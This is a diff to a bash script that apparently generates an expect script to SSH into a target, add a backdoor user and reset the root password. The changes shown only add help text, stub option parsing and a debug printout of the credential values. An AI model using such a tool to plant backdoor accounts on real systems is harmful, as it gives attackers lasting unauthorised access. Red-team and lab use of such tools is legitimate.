@@ -16,26 +16,29 @@ if [ "$1" = "-h" -o "$1" = "--help" ]; then
 	echo "			Specifying this option will only build the"
 	echo "			script and not execute after building it. This can be"
 	echo -e "			useful when preparing an expect script for later use.\n"
+	echo "	-n, --name <username_here>"
+	echo "			Allows user to specify the name of the backdoor user"
+	echo -e "		that will be added on the target."
 	echo "	-p, --port X"
 	echo "			Allows user to specify which port SSH is running on"
 	echo -e "			the target.\n"
 	echo "	-P, --password <your_password_here>"
-	echo "			Allows you to specify which password the backdoor"
+	echo "			Allows user to specify which password the backdoor"
 	echo -e "			user will have on the remote target.\n"
 	echo "	-r, --root-password"
-	echo "			Allows you to specify the new root password on the"
+	echo "			Allows user to specify the new root password on the"
 	echo -e "			target.\n"
 	echo "	-s,overwrite|append service1,service2"
-	echo "			Allows you to specify which services are started on"
-	echo "			the target. The overwrite option means you overwrite"
+	echo "			Allows user to specify which services are started on"
+	echo "			the target. The overwrite option means user overwrite"
 	echo "			the default services the script has configured. The"
-	echo "			append option allows you to add to the services"
+	echo "			append option allows user to add to the services"
 	echo -e "			already configured.\n"
 	echo "	-S,overwrite|append service1,service2"
 	echo "			Same as the -s option but this is for the services"
 	echo -e "			to be stopped on the target.\n"
 	echo "	-u, --userid X"
-	echo "			This option allows you to specify what you want the"
+	echo "			This option allows user to specify what user want the"
 	echo -e "			UID of backdoor user to be when added on the target.\n"
 	exit 0
 fi
@@ -71,7 +74,41 @@ if [ $# -gt 0 ]; then
 		pass=$2
 	fi
 	user=`echo $firstArg | /usr/bin/env awk -F"@" '{print $1}'`
-	shift 2
+	
+	shift 2 #get rid of user, host and pass
+	while [ $# -gt 0 ]; do #if there are still args leftover, they left options
+		param=`echo $1 | /usr/bin/env awk -F"," '{print $2}'`
+		case "$1" in
+			*-B|--build-only*)
+				echo "build only option not yet implemented"
+				;;
+			*-p|--port*)
+				echo "port option not yet implemented"
+				;;
+			*-P|--password*)
+				echo "password option not yet implemented"
+				;;
+			*-r|--root-password*)
+				echo "root password option not yet implemented"
+				;;
+			*-s*)
+				echo "start services option not yet implemented"
+				;;
+			*-S*)
+				echo "stop services option not yet implemented"
+				;;
+			*-u|--userid*)
+				echo "userid option not yet implemented"
+				;;
+			*)
+				echo "Arg '$1' not recognized...continuing anyway." 1>&2
+				if [ "$2" != "" -a "${2:0:1}" != "-" -a "${2:0:2}" != "--" ]; then
+					shift
+				fi
+				;;
+		esac
+		shift
+	done
 else
 	echo "Values can also be given as command line arguments."
 	read -p "Enter host: " host
@@ -84,6 +121,16 @@ fi
 if [ ${#port} -lt 1 ]; then #if no port given, make default 22
 		port=22
 fi
+
+echo "here are your values!"
+echo "newUser: '$newUser'"
+echo "newUserID: '$newUserID'"
+echo "newPass: '$newPass'"
+echo "newRootPass: '$newRootPass'"
+echo "port: '$port'"
+echo "buildOnly: '$buildOnly'"
+
+exit 0
 
 echo "#!/usr/bin/expect" > $expectFile #write shebang to file
 
